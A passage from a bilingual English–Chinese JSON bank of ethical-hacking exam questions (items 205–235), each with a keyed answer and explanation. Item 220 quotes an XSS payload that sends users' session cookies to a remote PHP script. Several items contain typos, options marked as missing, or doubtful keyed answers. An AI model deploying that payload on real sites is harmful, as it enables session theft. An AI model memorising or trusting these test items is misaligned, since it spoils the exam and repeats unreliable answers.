    "選項: A. B. C. D.": "A. Employing a tool like Sublist3r, which is designed to enumerate the subdomains of websites using OSINT (使用像 Sublist3r 這樣設計用於使用 OSINT 列舉網站子網域的工具) B. Analyzing Linkedin profiles to find employees of the target company and their job titles (分析 Linkedin 個人資料以尋找目標公司的員工及其職位名稱) C. Utilizing the Harvester tool to extract email addresses related to the target domain using a search engine like Google or Bing (利用 Harvester 工具使用 Google 或 Bing 等搜尋引擎提取與目標網域相關的電子郵件地址) D. Using a people search service, such as Spokeo or Intelius, to gather information about the employees of the target organization (使用像 Spokeo 或 Intelius 這樣的人員搜尋服務來收集有關目標組織員工的資訊)",
    "Answer": "A",
    "Explanation": "專門用於透過開源情報（OSINT）**列舉子網域**的工具，如 **Sublist3r**，是完成此任務的**最有效方法**。"
  },
  {
    "Question :": "205",
    "EN": "As a cybersecurity analyst for SecureNet, you are performing a security assessment of a new mobile payment application. One of your primary concerns is the **secure storage** of customer data on the device. The application stores sensitive information such as credit card details and personal identification numbers (PINs) on the device. Which of the following measures would best ensure the security of this data?",
    "C": "作為 SecureNet 的網路安全分析師，您正在對一個新的移動支付應用程式執行安全評估。您的主要關注點之一是客戶資料在設備上的**安全儲存**。該應用程式在設備上儲存了敏感資訊，例如信用卡詳細資訊和 PIN 碼。以下哪個措施最能確保這些資料的安全？",
    "選項: A. B. C. D.": "A. Implement biometric authentication for app access. (為應用程式存取實施生物識別身份驗證) B. Encrypt all sensitive data stored on the device. (加密儲存在設備上的所有敏感資料) C. Enable GPS tracking for all devices using the app. (為所有使用該應用程式的設備啟用 GPS 追蹤) D. Regularly update the app to the latest version. (定期將應用程式更新到最新版本)",
    "Answer": "B",
    "Explanation": "資料在設備上的**安全儲存**（Data-at-rest security）的最佳措施是**加密所有敏感資料**。即使設備遺失、被盜或被入侵，加密也能保護資料免遭未經授權的存取或洩露。"
  },
  {
    "Question :": "206",
    "EN": "Which iOS jailbreaking technique patches the kernel during the device boot so that it becomes jailbroken after each successive reboot?",
    "C": "哪種 iOS 越獄技術在設備啟動期間修補核心（kernel），以便在每次後續重啟後設備仍然處於越獄狀態？",
    "選項: A. B. C. D.": "A. Tethered jailbreaking (有線越獄) B. Semi-tethered jailbreaking (半有線越獄) C. Untethered jailbreaking (非有線越獄) D. Semi-Untethered jailbreaking (半非有線越獄)",
    "Answer": "C",
    "Explanation": "**非有線越獄（Untethered jailbreaking）**是將核心修補程式永久應用於設備核心的方法。這樣，即使設備重啟，使用者也**不需要**重新運行電腦上的越獄工具來恢復越獄狀態。"
  },
  {
    "Question :": "207",
    "EN": "A cybersecurity analyst in an organization is using the Common Vulnerability Scoring System to assess and prioritize identified vulnerabilities in their IT infrastructure. They encountered a vulnerability with a **base metric score of 7, a temporal metric score of 8, and an environmental metric score of 5**. Which statement best describes this scenario?",
    "C": "一個組織的網路安全分析師正在使用通用漏洞評分系統（CVSS）來評估和優先處理其 IT 基礎設施中已識別的漏洞。他們遇到了一個**基本評分（Base score）為 7、時間評分（Temporal score）為 8、環境評分（Environmental score）為 5** 的漏洞。哪個陳述最能描述這種情景？",
    "選項: A. B. C. D.": "A. The vulnerability has a medium severity with a high likelihood of exploitability over time and a considerable impact in their specific environment (該漏洞具有中等嚴重性，隨著時間的推移具有高度可利用性，並在其特定環境中具有相當大的影響) B. The vulnerability has a medium severity with a diminishing likelihood of exploitability over time, but a significant impact in their specific environment (該漏洞具有中等嚴重性，隨著時間的推移可利用性降低，但在其特定環境中具有顯著影響) C. The vulnerability has an overall high severity with a diminishing likelihood of exploitability over time, but it is less impactful in their specific environment (該漏洞具有總體高嚴重性，隨著時間的推移可利用性降低，但在其特定環境中影響較小) D. The vulnerability has an overall high severity, the likelihood of exploitability is increasing over time, and it has a medium impact in their specific environment (該漏洞具有總體高嚴重性，隨著時間的推移可利用性增加，並且在其特定環境中具有中等影響)",
    "Answer": "D",
    "Explanation": "CVSS v3.x 評級：1. **Base Score 7.0-8.9** 屬於 **High Severity**（高嚴重性）。2. **Temporal Score 8** **高於 Base Score 7**，表明其可利用性**隨著時間的推移正在增加**。3. **Environmental Score 5** **低於 Base Score 7**，表明在該**特定環境中影響較小**（中等影響）。因此，選項 D 最能準確描述這些評分。"
  },
  {
    "Question :": "208",
    "EN": "Becky has been hired by a client from Dubai to perform a penetration test against one of their remote offices. Working from her location in Columbus, Ohio, Becky runs her usual reconnaissance scans to obtain basic information about their network. When analyzing the results of her Whois search, Becky notices that the IP was allocated to a location in Le Havre, **France**. Which regional Internet registry should Becky go to for detailed information?",
    "C": "Becky 受杜拜客戶聘用，對他們的一個遠端辦公室執行滲透測試。Becky 從俄亥俄州哥倫布市的位置運行她慣常的偵察掃描以獲取網路的基本資訊。在分析她的 Whois 搜尋結果時，Becky 注意到 IP 位址被分配到**法國**勒阿弗爾的一個位置。Becky 應該去哪個地區網際網路註冊管理機構（RIR）獲取詳細資訊？",
    "選項: A. B. C. D.": "A. ARIN B. APNIC C. RIPE D. LACNIC",
    "Answer": "C",
    "Explanation": "IP 位址分配給**法國**（France），這屬於**歐洲地區**。**RIPE NCC**（Réseaux IP Européens Network Coordination Centre）是負責歐洲、中東和中亞地區的地區網際網路註冊管理機構（RIR）。"
  },
  {
    "Question :": "209",
    "EN": "You are the chief cybersecurity officer at CloudSecure Inc., and your team is responsible for securing a cloudbased application that handles sensitive customer data. To ensure that the data is protected from breaches, you have decided to implement encryption for both data-at-rest and data-in-transit. The development team suggests using SSL/TLS for securing data in transit. However, you want to also implement a mechanism to detect if the data was **tampered with** during transmission. Which of the following should you propose?",
    "C": "您是 CloudSecure Inc. 的首席網路安全官。開發團隊建議使用 SSL/TLS 來保護傳輸中的資料。但是，您還想實施一種機制來偵測資料在傳輸過程中是否被**篡改**。您應該提出以下哪一項建議？",
    "選項: A. B. C. D.": "A. Implement IPsec in addition to SSL/TLS. (除了 SSL/TLS，還實施 IPsec) B. Qswitch to using SSH for data transmission. (切換到使用 SSH 進行資料傳輸) C. Use the cloud service provider's built-in encryption services. (使用雲端服務提供者內建的加密服務) D. Encrypt data using the AES algorithm before transmission. (在傳輸前使用 AES 演算法加密資料)",
    "Answer": "A",
    "Explanation": "SSL/TLS 主要提供**加密**和**身份驗證**，但它並不能完全防止資料在傳輸中被篡改。**IPsec**（Internet Protocol Security）是一個在網路層提供**完整性**、**身份驗證**和加密的協定套件。結合 IPsec 和 SSL/TLS 可以為傳輸中的資料提供更高的完整性保護，以偵測篡改。"
  },
  {
    "Question :": "210",
    "EN": "An ethical hacker has been tasked with assessing the security of a major corporation's network. She suspects the network uses **default SNMP community strings**. To exploit this, she plans to extract valuable network information using SNMP enumeration. Which tool could best help her to get the information without directly modifying any parameters within the SNMP agent’s management information base (MIB)?",
    "C": "一名道德駭客的任務是評估一家大公司網路的安全性。她懷疑網路使用**預設的 SNMP 社區字串**。為利用此漏洞，她計劃使用 SNMP 列舉提取有價值的網路資訊。哪個工具可以最好地幫助她在不直接修改 SNMP 代理程式管理資訊庫（MIB）中任何參數的情況下獲取資訊？",
    "選項: A. B. C. D.": "A. snmp-check (snmp_enum Module) to gather a wide array of information about the target (snmp-check (snmp_enum 模組) 收集關於目標的廣泛資訊) B. Nmap, with a script to retrieve all running SNMP processes and associated ports (Nmap，帶有擷取所有運行 SNMP 流程和相關埠的腳本) C. Oputits, are mainly designed for device management and not SNMP enumeration (Oputits，主要用於設備管理而非 SNMP 列舉) D. SnmpWalk, with a command to change an OID to a different value (SnmpWalk，帶有更改 OID 值的命令)",
    "Answer": "A",
    "Explanation": "**snmp-check** 是一個專門的工具（或 Metasploit 的 `snmp_enum` 模組），用於**列舉** SNMP 設備並**提取**廣泛的系統資訊（如系統資訊、網路介面、使用者帳戶等），這符合駭客使用預設社區字串進行資訊收集的目的。"
  }
  {
    "Question :": "211",
    "EN": "A penetration tester was assigned to scan a large network range to find live hosts. The network is known for using strict **TCP filtering rules** on its firewall, which may obstruct common host discovery techniques. The tester needs a method that can **bypass these firewall restrictions** and accurately identify live systems. What host discovery technique should the tester use?",
    "C": "一名滲透測試人員的任務是掃描一個大型網路範圍以尋找活動主機。已知該網路在其防火牆上使用嚴格的 **TCP 過濾規則**，這可能會阻礙常見的主機發現技術。測試人員需要一種可以**繞過這些防火牆限制**並準確識別活動系統的方法。測試人員應該使用哪種主機發現技術？",
    "選項: A. B. C. D.": "A. UDP Ping Scan (UDP Ping 掃描) B. lCMP ECHO Ping Scan (ICMP ECHO Ping 掃描) C. ICMP Timestamp Ping Scan (ICMP 時間戳記 Ping 掃描) D. TCP SYN Ping Scan (TCP SYN Ping 掃描)",
    "Answer": "D",
    "Explanation": "在存在嚴格 TCP 過濾規則的環境中，**TCP SYN Ping 掃描**（`-PS`）是最佳的選擇。它模仿 TCP 三向握手的初始階段（發送 SYN），這是一種合法活動，因此大多數防火牆允許其通過。這使得它能夠有效繞過 ICMP 或 UDP 探測可能被阻止的限制。"
  },
  {
    "Question :": "212",
    "EN": "John, a security analyst working for an organization, found a critical vulnerability on the organization's LAN that allows him to view financial and personal information about the rest of the employees. Before reporting the vulnerability, he **examines the information shown by the vulnerability for two days without disclosing any information** to third parties or other internal employees. He does so out of **curiosity** about the other employees and **may take advantage of this information later**. What would John be considered as?",
    "C": "為組織工作的安全分析師 John 發現了一個允許他查看其他員工財務和個人資訊的關鍵漏洞。在報告漏洞之前，他**出於好奇**，對該漏洞顯示的資訊**檢查了兩天，沒有向第三方或其他內部員工披露任何資訊**，並且**可能會在以後利用這些資訊**。John 會被認為是哪一類人？",
    "選項: A. B. C. D.": "A. Cybercriminal (網路罪犯) B. Black hat (黑帽) C. White hat (白帽) D. Gray hat (灰帽)",
    "Answer": "D",
    "Explanation": "**灰帽駭客（Gray hat）**是指那些在未經授權的情況下發現漏洞，但隨後將其披露（或可能利用）的個體。John 的行為（在未經授權下出於好奇檢查資訊，並考慮以後利用）介於白帽（道德）和黑帽（惡意）之間，符合灰帽的定義。"
  },
  {
    "Question :": "213",
    "EN": "You are a cybersecurity consultant for a global organization. The organization has adopted a **Bring Your Own Device (BYOD) policy**, but they have recently experienced a phishing incident where an employee's device was compromised. In the investigation, you discovered that the phishing attack occurred through a third-party email app that the employee had installed. Given the need to **balance security and user autonomy** under the BYOD policy, how should the organization mitigate the risk of such incidents? Moreover, consider a measure that would prevent similar attacks **without overly restricting the use of personal devices**.",
    "C": "您是一家全球組織的網路安全顧問。該組織採用了 **BYOD 政策**，但最近經歷了網路釣魚事件。鑑於需要在 BYOD 政策下**平衡安全性和使用者自主權**，組織應該如何減輕此類事件的風險？考慮一個在**不過度限制個人設備使用**的情況下預防類似攻擊的措施。",
    "選項: A. B. C. D.": "A. Provide employees with corporate-owned devices for work-related tasks. (為員工提供公司擁有的設備以進行工作相關任務) B. Implement a mobile device management solution that restricts the installation of non-approved applications. (實施限制安裝未經批准應用程式的 MDM 解決方案) C. Require all employee devices to use a company-provided VPN for internet access. (要求所有員工設備使用公司提供的 VPN 進行網際網路存取) D. Conduct regular cybersecurity awareness training, focusing on phishing attacks. (進行定期的網路安全意識培訓，重點是網路釣魚攻擊)",
    "Answer": "D",
    "Explanation": "在 BYOD 政策下，最能平衡安全性和使用者自主權的措施是**培訓員工**。**定期的網路安全意識培訓**針對**人為因素**（釣魚攻擊），這是一種不過度限制個人設備使用的有效預防措施，同時提高員工對威脅的識別能力。"
  },
  {
    "Question :": "214",
    "EN": "An Internet Service Provider (ISP) has a need to authenticate users connecting via analog modems, Digital Subscriber Lines (DSL), wireless data services, and Virtual Private Networks (VPN) over a Frame Relay network. Which AAA protocol is the most likely able to handle this requirement?",
    "C": "一個網際網路服務提供者（ISP）需要對透過類比數據機、DSL、無線數據服務以及透過幀中繼網路的 VPN 連線的使用者進行身份驗證。哪個 AAA 協定最有可能處理此要求？",
    "選項: A. B. C. D.": "A. TACACS+ B. DIAMETER C. [選項缺失] D. RADIUS",
    "Answer": "D",
    "Explanation": "**RADIUS**（Remote Authentication Dial-In User Service）是一種網路協定，為連線並使用網路服務的使用者提供集中式的**身份驗證、授權和會計（AAA）管理**，它廣泛用於 ISP、撥號連線、DSL 和無線網路。"
  },
  {
    "Question :": "215",
    "EN": "Chandler works as a pen-tester... he uses a detection method where the anti-virus **executes the malicious codes on a virtual machine to simulate CPU and memory activities**. Which type of virus detection method did Chandler use in this context?",
    "C": "防毒軟體在**虛擬機器上執行惡意程式碼以模擬 CPU 和記憶體活動**。Chandler 使用了哪種類型的病毒偵測方法？",
    "選項: A. B. C. D.": "A. Heuristic Analysis B. Code Emulation (程式碼模擬) C. Scanning D. Integrity checking",
    "Answer": "B",
    "Explanation": "在受控環境（虛擬機器）中**執行**（executes）程式碼並觀察其行為，以模擬實際運作，這正是**程式碼模擬（Code Emulation）**或沙箱分析的原理。"
  },
  {
    "Question :": "216",
    "EN": "Your organization has signed an agreement with a web hosting provider that requires you to take **full responsibility of the maintenance of the cloud-based resources**. Which of the following models covers this?",
    "C": "您的組織與一個 Web 託管提供者簽署了一份協議，要求您對雲端資源的**維護負全部責任**。以下哪個模型涵蓋了此情況？",
    "選項: A. B. C. D.": "A. Platform as a service (平台即服務) B. Software as a service (軟體即服務) C. Functions as a service (功能即服務) D. Infrastructure as a service (基礎設施即服務)",
    "Answer": "D",
    "Explanation": "在 **基礎設施即服務（IaaS）**模型中，提供者只管理底層虛擬化層，而客戶（您）必須對作業系統、應用程式、資料、以及**維護負全部責任**。"
  },
  {
    "Question :": "217",
    "EN": "You want to analyze packets on your **wireless network**. Which program would you use?",
    "C": "您想分析您的**無線網路**上的封包。您會使用哪個程式？",
    "選項: A. B. C. D.": "A. Wireshark with Airpcap B. Airsnort with Airpcap C. Wireshark with Winpcap D. Ethereal with Winpcap",
    "Answer": "A",
    "Explanation": "Wireshark 是一款封包分析器。要在 Windows 系統上分析 **無線網路** 流量，需要一個能讓 NIC 進入監聽模式的適配器和驅動程式。**Airpcap** 是專門用於 **802.11 無線流量捕獲**的適配器，因此 **Wireshark 搭配 Airpcap** 是正確的工具組合。"
  },
  {
    "Question :": "218",
    "EN": "When considering how an attacker may exploit a web server, what is **web server footprinting**?",
    "C": "在考慮攻擊者如何利用 Web 伺服器時，什麼是 **Web 伺服器足跡收集**（web server footprinting）？",
    "選項: A. B. C. D.": "A. When an attacker implements a vulnerability scanner to identify weaknesses (當攻擊者實施漏洞掃描器來識別弱點時) B. When an attacker creates a complete profile of the site's external links and file structures (當攻擊者創建網站外部連結和檔案結構的完整概況時) C. When an attacker gathers system-level data, including account details and server names (當攻擊者收集系統級別資料，包括帳戶詳細資訊和伺服器名稱時) D. When an attacker uses a brute-force attack to crack a web-server password (當攻擊者使用暴力破解攻擊來破解 Web 伺服器密碼時)",
    "Answer": "C",
    "Explanation": "Web 伺服器足跡收集的目標是收集系統級資訊，例如**帳戶詳細資訊、伺服器名稱、電子郵件位址和目錄結構**，這是偵察階段的一部分。"
  },
  {
    "Question :": "219",
    "EN": "A DDOS attack is performed at **layer 7** to take down web infrastructure. **Partial HTTP requests** are sent to the web infrastructure or applications. Upon receiving a partial request, the target servers opens multiple connections and **keeps waiting** for the requests to complete. Which attack is being described here?",
    "C": "在**第 7 層**執行 DDOS 攻擊以使 Web 基礎設施癱瘓。**部分 HTTP 請求**被發送到 Web 基礎設施或應用程式。在收到部分請求後，目標伺服器會打開多個連線並**保持等待**請求完成。這裡描述的是哪種攻擊？",
    "選項: A. B. C. D.": "A. Desynchronization (不同步) B. Slowloris attack (Slowloris 攻擊) C. Session splicing (會話拼接) D. Phlashing (Phlashing)",
    "Answer": "B",
    "Explanation": "**Slowloris 攻擊**是一種第 7 層 DDoS 攻擊，它透過發送**不完整的 HTTP 請求**（例如標頭後慢慢發送請求體）來佔用伺服器的連線池，使伺服器保持**長時間的等待狀態**，從而耗盡資源，導致服務不可用。"
  },
  {
    "Question :": "220",
    "EN": "Judy created a forum, one day. she discovers that a user is posting strange images without writing comments. She immediately calls a security expert, who discovers that the following code is hidden behind those images: `<script> document.writef<img src=\"https://Ioca(host/submitcookie.php? cookie ='+ escape(document.cookie)+ \" />); < /script>` What issue occurred for the users who clicked on the image?",
    "C": "Judy 創建了一個論壇。有一天，她發現有使用者在沒有寫評論的情況下發布奇怪的圖片。她立即致電一位安全專家，專家發現這些圖片後面隱藏著以下程式碼：`[隱藏的腳本，試圖竊取 document.cookie]` 點擊該圖片的使用者會發生什麼問題？",
    "選項: A. B. C. D.": "A. The code inject a new cookie to the browser. (程式碼向瀏覽器注入一個新的 Cookie。) B. The code redirects the user to another site. (程式碼將使用者重定向到另一個網站。) C. The code is a virus that is attempting to gather the users username and password. (程式碼是試圖收集使用者名稱和密碼的病毒。) D. This php file silently executes the code and grabs the users session cookie and session ID. (這個 php 檔案靜默執行程式碼並抓取使用者的會話 Cookie 和會話 ID。)",
    "Answer": "D",
    "Explanation": "該程式碼是一個惡意的 **XSS 酬載**，它使用 `document.cookie` 語句來**竊取使用者的會話 Cookie**，並將其發送到一個遠端 URL (`https://Ioca(host/submitcookie.php? cookie =...`)。這會靜默執行並竊取使用者的會話憑證。"
  },
  {
    "Question :": "221",
    "EN": "Bob, your senior colleague, has sent you a mail regarding a deal with one of the clients. You are requested to accept the offer and you oblige. After 2 days, Bab denies that he had ever sent a mail. What do you want to ““know”” to prove yourself that it was Bob who had send a mail?",
    "C": "您的資深同事 Bob 發送了一封關於與某客戶交易的電子郵件給您。您被要求接受該提議，您也照做了。兩天後，Bob 否認他曾發送過該郵件。您想知道什麼來證明郵件是 Bob 發送的？",
    "選項: A. B. C. D.": "A. Non-Repudiation (不可否認性) B. Integrity (完整性) C. Authentication (身份驗證) D. Confidentiality (機密性)",
    "Answer": "A",
    "Explanation": "**不可否認性（Non-Repudiation）**是一種安全服務，它提供**資料來源的證明**和資料的完整性，使發送方（Bob）無法成功否認是他們發送了訊息。"
  },
  {
    "Question :": "222",
    "EN": "Being a Certified Ethical Hacker (CEH), a company has brought you on board to evaluate the safety measures in place for their network system. The company uses a network time protocol server in the demilitarized zone. During your enumeration, you decide to run a ntptrace command. Given the syntax: `ntptrace [-n] [-m maxhosts] [servername/IP_address]`, which command usage would best serve your objective to find where the NTP server obtains the time from and to trace the list of NTP servers connected to the network?",
    "C": "作為一名 CEH，一家公司聘請您來評估其網路系統的安全措施。該公司在 DMZ 中使用 NTP 伺服器。在您的列舉過程中，您決定運行 `ntptrace` 命令。給定語法：`ntptrace [-n] [-m maxhosts] [servername/IP_address]`，哪個命令用法最能實現您**查找 NTP 伺服器從何處獲取時間並追蹤連線到網路的 NTP 伺服器列表**的目標？",
    "選項: A. B. C. D.": "A. ntptrace -m 5 192.168.1.1 B. tptrace 192.1681. C. ntptrace -n localhost D. ntptrace -n -m 5 192.168.1.1",
    "Answer": "D",
    "Explanation": "`ntptrace` 用於追蹤時間來源。選項 D 中的 **`-n`** 標誌用於輸出 **IP 位址而不是主機名稱**，而 **`-m 5`** 標誌用於限制追蹤的**最大主機數**。這提供了最詳細和最受控的追蹤，以發現時間來源的鏈條。"
  },
  {
    "Question :": "223",
    "EN": "Which of the following types of SQL injection attacks **extends the results returned by the original query**, enabling attackers to run **two or more statements** if they have the same structure as the original one?",
    "C": "以下哪種類型的 SQL 注入攻擊**擴展了原始查詢返回的結果**，使攻擊者能夠在結構相同的情況下運行**兩個或更多語句**？",
    "選項: A. B. C. D.": "A. Error-based injection (基於錯誤的注入) B. Boolean-based blind SQL injection (基於布林的盲注 SQL 注入) C. Union SQL injection (聯合 SQL 注入) D. [選項缺失]",
    "Answer": "C",
    "Explanation": "**聯合 SQL 注入（Union SQL injection）**利用 `UNION SELECT` 語句將額外的 `SELECT` 語句結果**附加到**原始查詢的結果集中，前提是兩個查詢的欄位數量和資料類型結構相同。"
  },
  {
    "Question :": "224",
    "EN": "Juliet, a security researcher in an organization, was tasked with checking for the **authenticity of images** to be used in the organization's magazines. She used these images as a search query and **tracked the original source** and details of the images, which included photographs, profile pictures, and memes. Which of the following footprinting techniques did Rachel use to finish her task?",
    "C": "組織的安全研究員 Juliet 的任務是檢查將用於組織雜誌的**圖像的真實性**。她使用這些圖像作為搜尋查詢，並**追蹤原始來源**和圖像的詳細資訊。Rachel 用於完成其任務的足跡收集技術是什麼？",
    "選項: A. B. C. D.": "A. Reverse image search (反向圖像搜尋) B. Meta search engines (元搜尋引擎) C. Advanced image search (進階圖像搜尋) D. Google advanced search (Google 進階搜尋)",
    "Answer": "A",
    "Explanation": "**反向圖像搜尋（Reverse image search）**是一種足跡收集技術，其中圖像被用作搜尋查詢，以追蹤圖像的原始來源和相關資訊，用於驗證圖像的真實性。"
  },
  {
    "Question :": "225",
    "EN": "An attacker scans a host with the below command. Which three flags are set? `# nmap -sX host.domain.com`",
    "C": "Nmap 命令 `# nmap -sX host.domain.com` 設置了哪三個標誌？",
    "選項: A. B. C. D.": "A. This is SYN scan. SYN flag is set. B. This is Xmas scan. URG, PUSH and FIN are set. C. This is ACK scan. ACK flag is set. D. This is Xmas scan. SYN and ACK flags are set.",
    "Answer": "B",
    "Explanation": "Nmap 的 **`-sX`** 標誌執行 **Xmas 掃描**。在這種掃描中，**URG（緊急）、PUSH（推送）和 FIN（結束）**標誌都被設置（ON）。"
  },
  {
    "Question :": "226",
    "EN": "What information security law or standard aims at protecting stakeholders and the general public from **accounting errors and fraudulent activities** within organizations?",
    "C": "哪個資訊安全法律或標準旨在保護利害關係人和公眾免受組織內部的**會計錯誤和欺詐活動**的影響？",
    "選項: A. B. C. D.": "A. PCI-DSS B. FISMA C. SOX D. ISO/I EC 27001:2013",
    "Answer": "C",
    "Explanation": "**薩班斯-奧克斯利法案（SOX）**是美國國會於 2002 年通過的法律，旨在保護投資者免受公司**會計錯誤和欺詐**的影響，並提高公司披露的準確性和問責制。"
  },
  {
    "Question :": "227",
    "EN": "What is the most common method to exploit the **“Bash Bug” or “Shellshock”** vulnerability?",
    "C": "利用**「Bash Bug」或「Shellshock」**漏洞的最常用方法是什麼？",
    "選項: A. B. C. D.": "A. SYN Flood B. SSH C. Through Web servers utilizing CGI (Common Gateway Interface) to send a malformed environment variable to a vulnerable Web server (透過 Web 伺服器利用 CGI（通用網關介面）向易受攻擊的 Web 伺服器發送格式錯誤的環境變數) D. Manipulate format strings in text fields (操縱文字欄位中的格式字串)",
    "Answer": "C",
    "Explanation": "Shellshock 漏洞（CVE-2014-6271）影響了 Bash Shell。它最常見的攻擊媒介是透過 **Web 伺服器利用 CGI**（通用網關介面），因為 CGI 腳本將 HTTP 標頭轉換為環境變數，攻擊者可以在其中注入並執行惡意 Bash 程式碼。"
  },
  {
    "Question :": "228",
    "EN": "Which rootkit is characterized by its function of **adding code and/or replacing some of the operating-system kernel code** to obscure a backdoor on a system?",
    "C": "哪個 Rootkit 的特點是透過**添加程式碼和/或替換部分作業系統核心程式碼**來隱藏系統上的後門？",
    "選項: A. B. C. D.": "A. User-mode rootkit (使用者模式 Rootkit) B. Library-level rootkit (函式庫級別 Rootkit) C. Kernel-level rootkit (核心級別 Rootkit) D. Hypervisor-level rootkit (管理程式級別 Rootkit)",
    "Answer": "C",
    "Explanation": "**核心級別 Rootkit（Kernel-level rootkit）**在作業系統核心模式（Ring 0）下運行，具有最高權限，可以直接修改或替換核心程式碼來隱藏惡意軟體和活動。"
  },
  {
    "Question :": "229",
    "EN": "What type of a vulnerability/attack is it when the malicious person **forces the user’s browser to send an authenticated request to a server**?",
    "C": "當惡意人員**強制使用者的瀏覽器向伺服器發送已驗證的請求**時，這是哪種類型的漏洞/攻擊？",
    "選項: A. B. C. D.": "A. Session hijacking B. Server side request forgery C. Cross-site request forgery (跨站請求偽造) D. Cross-site scripting",
    "Answer": "C",
    "Explanation": "**跨站請求偽造（CSRF）**正是利用使用者在目標網站上的**已驗證狀態**，強制瀏覽器在使用者不知情的情況下發送惡意請求，執行非預期操作。"
  },
  {
    "Question :": "230",
    "EN": "An organization decided to harden its security against web-application and web-server attacks. John, a security personnel in the organization, employed a security scanner to automate web-application security testing and to guard the organization's web infrastructure against web-application threats. Using that tool, he also wants to detect XSS, directory transversal problems, fault injection, SQL injection, attempts to execute commands, and several other attacks. Which of the following security scanners will help John perform the above task?",
    "C": "一個組織決定加強其對 Web 應用程式和 Web 伺服器攻擊的安全性。John 使用一個安全掃描器來自動化 Web 應用程式安全測試，並保護 Web 基礎設施免受威脅。他還想用該工具偵測 XSS、目錄遍歷問題、故障注入、SQL 注入、執行命令嘗試和許多其他攻擊。以下哪個安全掃描器將幫助 John 執行上述任務？",
    "選項: A. B. C. D.": "A. AlienVault®OSSIM™ B. Syhunt Hybrid C. Saleae Logic Analyzer D. Cisco ASA",
    "Answer": "B",
    "Explanation": "**Syhunt Hybrid** 是一種 Web 應用程式安全掃描器，結合了靜態和動態分析，旨在自動偵測廣泛的 Web 應用程式漏洞，包括 XSS、SQL 注入和目錄遍歷等。"
  },
  {
    "Question :": "231",
    "EN": "Your company is developing a system that uses **symmetric encryption** for data encryption and **asymmetric encryption** for key exchange. To secure the system, you must also ensure the **secure exchange of the symmetric key**. Which of the following protocols would you recommend to the team to achieve this?",
    "C": "您的公司正在開發一個使用**對稱加密**進行資料加密和**非對稱加密**進行金鑰交換的系統。為保護系統安全，您還必須確保**對稱金鑰的安全交換**。您會推薦以下哪個協定來實現這一點？",
    "選項: A. B. C. D.": "A. Implementing SSL certificates on your company's web servers. (在公司的 Web 伺服器上實施 SSL 憑證) B. Applying the Diffie-Hellman protocol to exchange the symmetric key. (應用 Diffie-Hellman 協定交換對稱金鑰) C. Switching all data transmission to the HTTPS protocol. (將所有資料傳輸切換到 HTTPS 協定) D. Utilizing SSH for secure remote logins to the servers. (利用 SSH 進行伺服器的安全遠端登入)",
    "Answer": "B",
    "Explanation": "**Diffie-Hellman 協定**是一種**金鑰協定（Key Agreement Protocol）**，允許兩個或多個實體在不安全的通道上安全地**建立共享秘密金鑰**（即對稱金鑰），這是實現安全金鑰交換的標準方法。"
  },
  {
    "Question :": "232",
    "EN": "BitLocker encryption has been implemented for all the Windows-based computers in an organization. You are concerned that someone might lose their cryptographic key. Therefore, a mechanism was implemented to recover the keys from Active Directory. What is this mechanism called in cryptography?",
    "C": "組織中的所有 Windows 電腦都實施了 BitLocker 加密。您擔心有人可能會丟失他們的加密金鑰。因此，實施了一種從 Active Directory 恢復金鑰的機制。在密碼學中，這種機制被稱為什麼？",
    "選項: A. B. C. D.": "A. Key archival (金鑰存檔) B. Key escrow. (金鑰託管) C. Certificate rollover (憑證滾動) D. Key renewal (金鑰續訂)",
    "Answer": "B",
    "Explanation": "**金鑰託管（Key escrow）**是一種將加密金鑰的副本儲存給第三方（例如 Active Directory）以用於備份或恢復目的的機制，這允許在金鑰遺失時恢復加密資料。"
  },
  {
    "Question :": "233",
    "EN": "Attacker Simon targeted the communication network of an organization and disabled the security controls of NetNTLMv1 by modifying the values of LMCompatibilityLevel, NTLMMinClientSec, and RestrictSendingNTLMTraffic. He then extracted all the non-network logon tokens from all the active processes to masquerade as a legitimate user to launch further attacks. What is the type of attack performed by Simon?",
    "C": "攻擊者 Simon 鎖定了一個組織的通訊網路，並透過修改 LMCompatibilityLevel、NTLMMinClientSec 和 RestrictSendingNTLMTraffic 的值來禁用 NetNTLMv1 的安全控制。然後，他從所有活動進程中提取所有**非網路登入權杖**，冒充合法使用者發起進一步攻擊。Simon 執行的攻擊類型是什麼？",
    "選項: A. B. C. D.": "A. Internal monologue attack (內部獨白攻擊) B. Combinator attack (組合攻擊) C. Rainbow table attack (彩虹表攻擊) D. Dictionary attack (字典攻擊)",
    "Answer": "A",
    "Explanation": "**內部獨白攻擊（Internal monologue attack）**利用了 Windows 安全支援提供者介面（SSPI）中的 NTLM 身份驗證，透過提取「非網路登入權杖」（通常是本地權杖）來**冒充合法使用者**，這是一種針對 NTLMv1 協議的進階攻擊。"
  },
  {
    "Question :": "234",
    "EN": "An organization has automated the operation of critical infrastructure from a remote location. For this purpose, all the industrial control systems are connected to the Internet. To empower the manufacturing process, ensure the reliability of industrial networks, and reduce downtime and service disruption, the organization deckled to install an OT security tool that further protects against security incidents such as cyber espionage, zero-day attacks, and malware. Which of the following tools must the organization employ to protect its critical infrastructure?",
    "C": "一個組織已從遠端位置自動化了關鍵基礎設施的操作。為此，所有工業控制系統都連線到網際網路。為賦予製造流程能力、確保工業網路的可靠性並減少停機時間和服務中斷，該組織決定安裝一個 OT 安全工具，以進一步防範網路間諜、零日攻擊和惡意軟體等安全事件。該組織必須採用以下哪個工具來保護其關鍵基礎設施？",
    "選項: A. B. C. D.": "A. Robotium B. BalenaCloud C. Flowmon D. IntentFuzzer",
    "Answer": "C",
    "Explanation": "**Flowmon** 是一種網路安全和監控工具，旨在透過持續監控和異常偵測，確保**工業網路**的可靠性，並防範網路間諜和惡意軟體等安全事件。"
  },
  {
    "Question :": "235",
    "EN": "John is investigating web-application firewall logs and observers that someone is attempting to inject the following: `char buff[10]; buff[>o] - 'a':` What type of attack is this?",
    "C": "John 正在調查 Web 應用程式防火牆日誌，並觀察到有人正試圖注入以下內容：`char buff[10]; buff[>o] - 'a':` 這是哪種類型的攻擊？",
    "選項: A. B. C. D.": "A. CSRF B. XSS C. Buffer overflow (緩衝區溢位) D. SQL injection",
    "Answer": "C",
    "Explanation": "程式碼片段 `char buff[10];` 聲明了一個大小為 10 個字元的緩衝區。`buff[>o]` 試圖將資料寫入超出該緩衝區限制的記憶體位置（`>o` 是一個無效的寫入操作，但意圖是寫入溢出），這是**緩衝區溢位（Buffer overflow）**攻擊的典型特徵。"
  },
  {
    "Question :": "236",
